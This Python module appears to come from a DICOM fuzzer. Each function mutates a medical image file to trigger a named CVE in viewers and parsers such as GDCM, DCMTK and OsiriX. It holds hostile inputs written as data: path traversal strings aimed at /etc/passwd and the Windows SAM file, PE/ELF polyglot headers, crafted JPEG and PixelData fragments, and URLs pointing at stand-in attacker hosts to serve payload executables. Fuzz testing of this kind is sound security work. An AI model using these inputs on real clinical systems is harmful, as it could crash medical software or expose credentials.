"""CVE Protocol and Parser Mutations.

Mutations targeting parser-level vulnerabilities, polyglot attacks,
JPEG codec issues, and protocol-level exploits.

Covered CVEs:
- CVE-2020-29625: DCMTK DoS via malformed length fields
- CVE-2021-41946: ClearCanvas path traversal
- CVE-2022-24193: OsiriX deep nesting DoS
- CVE-2019-11687: DICOM preamble polyglot (PE/ELF)
- CVE-2025-11266: GDCM encapsulated PixelData underflow
- CVE-2025-53618/53619: GDCM JPEG codec OOB read
- CVE-2024-33606: MicroDicom URL scheme bypass
- CVE-2025-1001: RadiAnt certificate validation bypass
- CVE-2025-1002: MicroDicom certificate verification bypass
- CVE-2025-27578: OsiriX MD use-after-free (remote)
- CVE-2025-31946: OsiriX MD use-after-free (local)
"""

from __future__ import annotations

import random
import struct


def mutate_malformed_length_field(data: bytes) -> bytes:
    """Create mutation targeting malformed length fields.

    DCMTK and other parsers can hang or crash with:
    1. Undefined length (0xFFFFFFFF) in non-sequence elements
    2. Length larger than remaining file
    3. Negative length interpretations
    """
    result = bytearray(data)

    # Find VR length fields (look for common VRs followed by length)
    vr_patterns = [b"OB", b"OW", b"OF", b"SQ", b"UN", b"UC", b"UR", b"UT"]

    for vr in vr_patterns:
        idx = 0
        while True:
            idx = result.find(vr, idx)
            if idx == -1:
                break

            # Check if this looks like a VR (should be after tag)
            if idx >= 4 and idx + 6 < len(result):
                # Set undefined length (0xFFFFFFFF)
                if random.random() < 0.3:
                    result[idx + 2 : idx + 6] = b"\xff\xff\xff\xff"

            idx += 1

    return bytes(result)


def mutate_oversized_length(data: bytes) -> bytes:
    """Create mutation with length larger than remaining file."""
    result = bytearray(data)

    # Find length fields and set to larger than remaining
    # Look for explicit VR length patterns
    for i in range(len(result) - 8):
        # Check for 4-byte length after VR
        if result[i : i + 2] in [b"OB", b"OW", b"SQ", b"UN"]:
            if i + 6 < len(result):
                remaining = len(result) - i
                # Set length to 2x remaining
                oversized = remaining * 2
                result[i + 4 : i + 8] = struct.pack("<I", oversized)
                break

    return bytes(result)


def mutate_path_traversal_filename(data: bytes) -> bytes:
    """Create mutation targeting path traversal in file references.

    Inject path traversal sequences in Referenced File ID and similar fields.
    """
    result = bytearray(data)

    # Path traversal payloads
    payloads = [
        b"../../../etc/passwd",
        b"..\\..\\..\\windows\\system32\\config\\sam",
        b"/etc/passwd",
        b"\\\\server\\share\\file",
        b"file:///etc/passwd",
        b"....//....//....//etc/passwd",
        b"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ]

    payload = random.choice(payloads)

    # Look for Referenced File ID (0004,1500) or similar
    ref_file_tag = b"\x04\x00\x00\x15"
    idx = data.find(ref_file_tag)
    if idx != -1 and idx + 8 < len(result):
        # Replace value with path traversal payload
        vr_length_offset = idx + 4
        if vr_length_offset + 4 < len(result):
            # Set length to payload length
            result[vr_length_offset + 2 : vr_length_offset + 4] = struct.pack(
                "<H", len(payload)
            )
            # Insert payload (may corrupt file, but that's the point)
            result = (
                result[: vr_length_offset + 4]
                + payload
                + result[vr_length_offset + 4 + len(payload) :]
            )

    return bytes(result)


def mutate_deep_nesting(data: bytes) -> bytes:
    """Create mutation with extremely deep sequence nesting.

    Deep nesting can exhaust stack space or cause exponential parsing time.
    """
    result = bytearray(data)

    # Create a deeply nested sequence structure
    nesting_depth = random.randint(100, 500)

    # Sequence Item delimiter
    item_start = b"\xfe\xff\x00\xe0"  # Item
    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation Item

    # Build nested structure
    nested = b""
    for _ in range(nesting_depth):
        nested = (
            item_start + b"\xff\xff\xff\xff" + nested + item_end + b"\x00\x00\x00\x00"
        )

    # Find a sequence tag and append nested structure
    sq_tag = b"\x08\x00\x05\x11"  # Referenced Series Sequence
    idx = data.find(sq_tag)
    if idx != -1:
        result = result[: idx + 4] + nested + result[idx + 4 :]
    else:
        # Append to end before trailing bytes
        result = result[:-4] + nested + result[-4:]

    return bytes(result)


def mutate_pe_polyglot_preamble(data: bytes) -> bytes:
    """Create PE/DICOM polyglot by injecting PE header in preamble.

    The 128-byte DICOM preamble can contain executable code.
    """
    result = bytearray(data)

    # Minimal PE header stub (DOS header)
    pe_header = (
        b"MZ"  # DOS signature
        + b"\x90" * 58  # DOS header padding
        + struct.pack("<I", 0x80)  # PE header offset at 0x80
        + b"\x00" * 64  # More padding
    )

    # Ensure we have at least 128 bytes of preamble
    if len(result) < 132:
        return bytes(result)

    # Inject PE header into preamble (first 128 bytes)
    result[: len(pe_header)] = pe_header[:128]

    return bytes(result)


def mutate_elf_polyglot_preamble(data: bytes) -> bytes:
    """Create ELF/DICOM polyglot by injecting ELF header in preamble."""
    result = bytearray(data)

    # Minimal ELF header
    elf_header = (
        b"\x7fELF"  # ELF magic
        + b"\x01"  # 32-bit
        + b"\x01"  # Little endian
        + b"\x01"  # ELF version
        + b"\x00" * 9  # Padding
        + struct.pack("<H", 2)  # ET_EXEC
        + struct.pack("<H", 3)  # EM_386
        + struct.pack("<I", 1)  # EV_CURRENT
        + b"\x00" * 100  # Rest of header
    )

    if len(result) < 132:
        return bytes(result)

    # Inject ELF header into preamble
    result[: min(len(elf_header), 128)] = elf_header[:128]

    return bytes(result)


def mutate_invalid_transfer_syntax(data: bytes) -> bytes:
    """Inject invalid or malicious transfer syntax UIDs.

    Some parsers crash or behave unexpectedly with:
    1. Unknown transfer syntax UIDs
    2. Mismatched transfer syntax (e.g., compressed header, uncompressed data)
    3. Malformed UID strings
    """
    result = bytearray(data)

    malicious_uids = [
        b"1.2.3.4.5.6.7.8.9.0" + b"." * 50,  # Excessively long UID
        b"0.0",  # Minimal UID
        b"1.2.840.10008.1.2.4.9999",  # Non-existent JPEG variant
        b"\x00" * 64,  # Null bytes
        b"AAAA" * 16,  # ASCII (invalid UID format)
        b"1.2.840.10008.1.2.1\x00\x00\x00",  # Embedded nulls
    ]

    uid = random.choice(malicious_uids)

    # Find Transfer Syntax UID (0002,0010)
    ts_tag = b"\x02\x00\x10\x00"
    idx = data.find(ts_tag)
    if idx != -1 and idx + 8 < len(result):
        # Set length and value
        result[idx + 6 : idx + 8] = struct.pack("<H", len(uid))
        result = result[: idx + 8] + uid + result[idx + 8 + len(uid) :]

    return bytes(result)


def mutate_encapsulated_pixeldata_underflow(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-11266 integer underflow.

    GDCM vulnerability in encapsulated PixelData fragment parsing:
    - Unsigned integer underflow in buffer indexing
    - Triggered by malformed fragment structures
    - Causes out-of-bounds write leading to segfault

    Attack vector: Malformed encapsulated PixelData with invalid fragment sizes.
    """
    result = bytearray(data)

    # Encapsulated PixelData markers
    pixel_data_tag = b"\xe0\x7f\x10\x00"  # (7FE0,0010) PixelData
    item_tag = b"\xfe\xff\x00\xe0"  # Item delimiter
    seq_delim = b"\xfe\xff\xdd\xe0"  # Sequence delimitation

    # Find PixelData tag
    idx = data.find(pixel_data_tag)
    if idx == -1:
        # No PixelData found, create malicious encapsulated structure
        malicious_encap = (
            pixel_data_tag
            + b"OB"  # VR
            + b"\x00\x00"  # Reserved
            + b"\xff\xff\xff\xff"  # Undefined length
            # Fragment 0 (offset table) - malformed
            + item_tag
            + b"\x00\x00\x00\x00"  # Empty offset table
            # Fragment 1 - underflow trigger: size that causes underflow
            + item_tag
            + struct.pack("<I", 0xFFFFFFFF)  # Max uint32 size (underflow trigger)
            + b"\xff" * 16  # Minimal data
            # Fragment 2 - zero size (edge case)
            + item_tag
            + b"\x00\x00\x00\x00"
            # Sequence end
            + seq_delim
            + b"\x00\x00\x00\x00"
        )
        result = result[:-4] + malicious_encap + result[-4:]
    else:
        # Modify existing PixelData to trigger underflow
        search_start = idx + 8
        fragment_idx = result.find(item_tag, search_start)
        if fragment_idx != -1:
            # Set fragment length to trigger underflow (0xFFFFFFFF)
            length_pos = fragment_idx + 4
            if length_pos + 4 < len(result):
                result[length_pos : length_pos + 4] = b"\xff\xff\xff\xff"

    return bytes(result)


def mutate_fragment_count_mismatch(data: bytes) -> bytes:
    """Create mutation with mismatched fragment counts.

    Targets parsers that pre-allocate based on offset table but receive
    different number of actual fragments.
    """
    result = bytearray(data)

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    # Create structure with offset table claiming more fragments than exist
    malicious = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"  # Undefined length
        # Offset table claiming 10 fragments
        + item_tag
        + struct.pack("<I", 40)  # 10 offsets * 4 bytes
        + struct.pack("<I", 0) * 10  # 10 offset entries
        # But only provide 1 actual fragment
        + item_tag
        + struct.pack("<I", 8)
        + b"\x00" * 8
        # End sequence early
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    # Append to end
    result = result[:-4] + malicious + result[-4:]
    return bytes(result)


def mutate_jpeg_codec_oob_read(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-53618/53619 JPEG codec OOB read.

    GDCM JPEGBITSCodec::InternalCode vulnerability:
    - Out-of-bounds read during JPEG decompression
    - Can leak memory contents (information disclosure)
    - Triggered by malformed JPEG stream in encapsulated PixelData

    Attack vector: Crafted JPEG with invalid Huffman tables or segment sizes.
    """
    result = bytearray(data)

    # JPEG markers
    soi = b"\xff\xd8"  # Start of Image
    eoi = b"\xff\xd9"  # End of Image
    sof0 = b"\xff\xc0"  # Start of Frame (baseline DCT)
    dht = b"\xff\xc4"  # Define Huffman Table
    sos = b"\xff\xda"  # Start of Scan

    # Create malformed JPEG that triggers OOB read in Huffman decoding
    malformed_jpeg = (
        soi
        # SOF0 with invalid dimensions that cause buffer miscalculation
        + sof0
        + struct.pack(">H", 11)  # Length
        + b"\x08"  # Precision
        + struct.pack(">H", 0xFFFF)  # Height (max)
        + struct.pack(">H", 0xFFFF)  # Width (max)
        + b"\x01"  # Components
        + b"\x01\x11\x00"  # Component spec
        # DHT with truncated/invalid Huffman table
        + dht
        + struct.pack(">H", 5)  # Length too short for valid table
        + b"\x00"  # Table class/ID
        + b"\xff\xff"  # Invalid counts (will cause OOB read)
        # SOS with invalid scan header
        + sos
        + struct.pack(">H", 8)  # Length
        + b"\x01"  # Components
        + b"\x01\x00"  # Component selector
        + b"\x00\x3f\x00"  # Spectral selection
        # Minimal scan data (truncated)
        + b"\x00" * 4
        + eoi
    )

    # Wrap in DICOM encapsulated format
    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    encapsulated = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        # Empty offset table
        + item_tag
        + b"\x00\x00\x00\x00"
        # JPEG fragment
        + item_tag
        + struct.pack("<I", len(malformed_jpeg))
        + malformed_jpeg
        # End
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    # Append to data
    result = result[:-4] + encapsulated + result[-4:]
    return bytes(result)


def mutate_jpeg_truncated_stream(data: bytes) -> bytes:
    """Create mutation with truncated JPEG stream.

    Parser may read beyond buffer when stream ends unexpectedly.
    """
    result = bytearray(data)

    # Minimal JPEG that's truncated mid-scan
    truncated_jpeg = (
        b"\xff\xd8"  # SOI
        b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"  # APP0
        b"\xff\xdb\x00\x43\x00"  # DQT header
        + b"\x10" * 64  # Quantization table
        + b"\xff\xc0\x00\x0b\x08\x00\x10\x00\x10\x01\x01\x11\x00"  # SOF0
        + b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"  # SOS header
        # Truncate here - no scan data or EOI
    )

    pixel_data_tag = b"\xe0\x7f\x10\x00"
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    encapsulated = (
        pixel_data_tag
        + b"OB\x00\x00"
        + b"\xff\xff\xff\xff"
        + item_tag
        + b"\x00\x00\x00\x00"
        + item_tag
        + struct.pack("<I", len(truncated_jpeg))
        + truncated_jpeg
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    result = result[:-4] + encapsulated + result[-4:]
    return bytes(result)


def mutate_url_scheme_bypass(data: bytes) -> bytes:
    """Create mutation targeting CVE-2024-33606 URL scheme bypass.

    MicroDicom URL scheme vulnerability:
    - Bypass of security restrictions via crafted URLs in DICOM elements
    - Can lead to arbitrary file access or code execution

    Attack vector: Malicious URLs in Retrieve URL or similar elements.
    """
    result = bytearray(data)

    # Malicious URL payloads for various bypass techniques
    url_payloads = [
        b"file:///C:/Windows/System32/config/SAM",
        b"file://localhost/etc/passwd",
        b"\\\\attacker.com\\share\\payload.exe",
        b"http://127.0.0.1:8080/../../etc/passwd",
        b"javascript:alert(1)",  # If rendered in web view
        b"data:text/html,<script>alert(1)</script>",
        b"file:///proc/self/environ",
        b"dict://attacker:11111/",
        b"gopher://attacker:70/_",
        b"ldap://attacker/exploit",
    ]

    payload = random.choice(url_payloads)

    # Target Retrieve URL (0008,1190) or Retrieve URI (0040,E010)
    retrieve_url_tag = b"\x08\x00\x90\x11"  # (0008,1190) Retrieve URL
    retrieve_uri_tag = b"\x40\x00\x10\xe0"  # (0040,E010) Retrieve URI

    # Try to find and modify existing URL element
    for tag in [retrieve_url_tag, retrieve_uri_tag]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
            break
    else:
        # Inject new Retrieve URL element
        insert_pos = min(300, len(result) - 4)
        url_element = (
            retrieve_url_tag + b"UR" + struct.pack("<H", len(payload)) + payload
        )
        result = result[:insert_pos] + url_element + result[insert_pos:]

    return bytes(result)


def mutate_certificate_validation_bypass(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-1001 certificate validation bypass.

    RadiAnt DICOM Viewer vulnerability:
    - Improper certificate validation in update mechanism
    - Allows MITM attacks with malicious updates

    Attack vector: Inject update-related URLs/paths in DICOM metadata.
    """
    result = bytearray(data)

    # Payloads that simulate malicious update redirection
    update_payloads = [
        b"https://attacker.com/DicomViewer_Update.exe",
        b"http://localhost:8080/malicious_update.msi",
        b"\\\\evil.com\\updates\\viewer.exe",
        b"https://update.legitimate-domain.com.attacker.com/update",
        b"https://DicomViewer.com@attacker.com/update.exe",
    ]

    payload = random.choice(update_payloads)

    # Inject in Institution Address or similar text field
    institution_addr_tag = b"\x08\x00\x81\x00"  # (0008,0081) Institution Address
    station_name_tag = b"\x08\x00\x10\x10"  # (0008,1010) Station Name

    for tag in [institution_addr_tag, station_name_tag]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            result[idx + 6 : idx + 8] = struct.pack("<H", len(payload))
            result = result[: idx + 8] + payload + result[idx + 8 + len(payload) :]
            break
    else:
        # Inject as Software Versions (0018,1020)
        software_tag = b"\x18\x00\x20\x10"
        insert_pos = min(250, len(result) - 4)
        element = software_tag + b"LO" + struct.pack("<H", len(payload)) + payload
        result = result[:insert_pos] + element + result[insert_pos:]

    return bytes(result)


def mutate_use_after_free_remote(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-27578 use-after-free.

    OsiriX MD vulnerability:
    - Use-after-free via crafted DICOM file upload
    - Causes memory corruption leading to DoS
    - Could potentially allow code execution

    Attack vector: Malformed sequences with dangling references.
    """
    result = bytearray(data)

    # Create sequence structure that may cause UAF
    sq_tag = b"\x08\x00\x15\x11"  # Referenced Series Sequence
    item_start = b"\xfe\xff\x00\xe0"  # Item
    item_end = b"\xfe\xff\x0d\xe0"  # Item Delimitation
    seq_delim = b"\xfe\xff\xdd\xe0"  # Sequence Delimitation

    # Create malformed sequence with premature termination
    uaf_sequence = (
        sq_tag
        + b"SQ\x00\x00"
        + b"\xff\xff\xff\xff"  # Undefined length
        # Item 1 - valid
        + item_start
        + struct.pack("<I", 8)  # Length 8
        + b"\x00" * 8
        # Item 2 - starts but immediately ends sequence
        + item_start
        + b"\xff\xff\xff\xff"  # Undefined length
        # Premature sequence end without item end
        + seq_delim
        + b"\x00\x00\x00\x00"
        # More data after sequence end - may reference freed memory
        + b"\x08\x00\x16\x00"  # (0008,0016) SOP Class UID
        + b"UI"
        + struct.pack("<H", 26)
        + b"1.2.840.10008.5.1.4.1.1.2"
        + b"\x00"
    )

    # Also corrupt existing sequences if present
    idx = data.find(sq_tag)
    if idx != -1:
        # Find item delimiter and corrupt it
        item_idx = result.find(item_end, idx)
        if item_idx != -1:
            # Replace item end with garbage to confuse parser
            result[item_idx : item_idx + 4] = b"\x00\x00\x00\x00"

    # Append UAF-triggering structure
    result = result[:-4] + uaf_sequence + result[-4:]

    return bytes(result)


def mutate_use_after_free_local(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-31946 local use-after-free.

    OsiriX MD vulnerability:
    - Local use-after-free via crafted DICOM import
    - Causes memory corruption or system crash
    - Triggered by specific PixelData/sequence patterns

    Attack vector: Malformed PixelData with dangling frame references.
    """
    result = bytearray(data)

    pixel_data_tag = b"\xe0\x7f\x10\x00"  # (7FE0,0010)
    item_tag = b"\xfe\xff\x00\xe0"
    seq_delim = b"\xfe\xff\xdd\xe0"

    # Create encapsulated PixelData that may cause UAF
    uaf_pixel_data = (
        pixel_data_tag
        + b"OW\x00\x00"
        + b"\xff\xff\xff\xff"  # Undefined length
        # Offset table with invalid offsets pointing to freed regions
        + item_tag
        + struct.pack("<I", 16)  # 4 offsets
        + struct.pack("<I", 0)  # Offset 0 (valid)
        + struct.pack("<I", 0xFFFFFFFF)  # Invalid offset (may cause UAF)
        + struct.pack("<I", 0x80000000)  # Large offset
        + struct.pack("<I", 0xDEADBEEF)  # Marker for debugging
        # Fragment 0
        + item_tag
        + struct.pack("<I", 4)
        + b"\x00\x00\x00\x00"
        # Missing fragments - parser may try to access freed memory
        # Premature end
        + seq_delim
        + b"\x00\x00\x00\x00"
    )

    # Replace existing PixelData or append
    idx = data.find(pixel_data_tag)
    if idx != -1:
        # Corrupt existing PixelData length
        if idx + 12 < len(result):
            result[idx + 8 : idx + 12] = b"\xff\xff\xff\xff"
    else:
        result = result[:-4] + uaf_pixel_data + result[-4:]

    return bytes(result)


def mutate_certificate_bypass_microdicom(data: bytes) -> bytes:
    """Create mutation targeting CVE-2025-1002 certificate verification bypass.

    MicroDicom DICOM Viewer vulnerability (CVSS 5.7):
    - Certificate verification bypass similar to CVE-2025-1001 (RadiAnt)
    - Allows MITM attacks on TLS connections
    - Can intercept or modify DICOM data in transit

    Attack vector: DICOM metadata with URLs/endpoints that bypass cert checks.
    Reference: CISA ICSMA-25-121-01, Digital NHS CC-4650
    """
    result = bytearray(data)

    # Target metadata fields that may contain URLs or network endpoints
    # These fields could trigger connections that bypass certificate validation

    # RetrieveURL (0008,1190) - WADO endpoint
    retrieve_url_tag = b"\x08\x00\x90\x11"
    # InstitutionAddress (0008,0081) - may contain URLs in some implementations
    institution_tag = b"\x08\x00\x81\x00"
    # ReferencedSOPClassUID locations for potential WADO-RS references
    ref_sop_tag = b"\x08\x00\x50\x11"

    # MITM attack URLs - these trigger certificate validation code paths
    mitm_urls = [
        b"https://attacker.example.com/wado",
        b"https://self-signed.badssl.com/dicom",
        b"https://expired.badssl.com/dicom",
        b"https://wrong.host.badssl.com/dicom",
        b"https://untrusted-root.badssl.com/dicom",
        b"https://127.0.0.1:8080/dicom",  # Localhost bypass
        b"https://[::1]:8080/dicom",  # IPv6 localhost
    ]

    mitm_url = random.choice(mitm_urls)
    # Pad to even length for DICOM compliance
    if len(mitm_url) % 2:
        mitm_url += b" "

    # Try to inject/modify URL fields
    for tag in [retrieve_url_tag, institution_tag]:
        idx = data.find(tag)
        if idx != -1 and idx + 8 < len(result):
            # Set the URL value
            result[idx + 6 : idx + 8] = struct.pack("<H", len(mitm_url))
            # This may corrupt following data - intentional for fuzzing

    # Also inject a new RetrieveURL element if not present
    if data.find(retrieve_url_tag) == -1:
        insert_pos = min(200, len(result) - 4)
        url_element = (
            retrieve_url_tag
            + b"UR"  # VR for URI
            + struct.pack("<H", len(mitm_url))
            + mitm_url
        )
        result = result[:insert_pos] + url_element + result[insert_pos:]

    return bytes(result)
